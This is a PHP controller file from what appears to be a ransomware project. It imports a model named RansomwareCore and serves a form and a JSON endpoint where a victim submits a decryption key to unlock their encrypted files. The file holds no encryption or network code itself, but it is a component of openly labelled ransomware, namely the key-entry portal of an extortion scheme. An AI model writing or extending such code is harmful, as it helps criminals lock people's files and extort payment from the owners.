<?php
namespace App\Controllers;

use App\Models\RansomwareCore;
use App\Core\Logger;

class DecryptionController {
    public function index() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            return $this->processDecryption();
        }
        
        $this->showDecryptionForm();
    }
    
    public function apiDecrypt() {
        header('Content-Type: application/json');
        
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['success' => false, 'error' => 'Method not allowed']);
            return;
        }
        
        $input = json_decode(file_get_contents('php://input'), true);
        $decryptionKey = $input['key'] ?? '';
        
        if (empty($decryptionKey)) {
            http_response_code(400);
            echo json_encode(['success' => false, 'error' => 'Decryption key is required']);
            return;
        }
        
        try {
            $core = new RansomwareCore();
            $result = $core->executeDecryption($decryptionKey);
            
            echo json_encode($result);
            
        } catch (\Exception $e) {
            http_response_code(500);
            echo json_encode(['success' => false, 'error' => $e->getMessage()]);
        }
    }
    
    private function processDecryption() {
        $decryptionKey = $_POST['decryption_key'] ?? '';
        
        if (empty($decryptionKey)) {
            $error = "Please enter decryption key";
            $this->showDecryptionForm($error);
            return;
        }
        
        try {
            $core = new RansomwareCore();
            $result = $core->executeDecryption($decryptionKey);
            
            if ($result['success']) {
                $this->showSuccessMessage($result['decrypted_files']);
            } else {
                $this->showDecryptionForm("Decryption failed: Invalid key or system error");
            }
            
        } catch (\Exception $e) {
            $this->showDecryptionForm("Decryption error: " . $e->getMessage());
        }
    }
    
    private function showDecryptionForm($error = '') {
        include __DIR__ . '/../Views/decryption_form.php';
        exit;
    }
    
    private function showSuccessMessage($decryptedFiles) {
        include __DIR__ . '/../Views/decryption_success.php';
        exit;
    }
}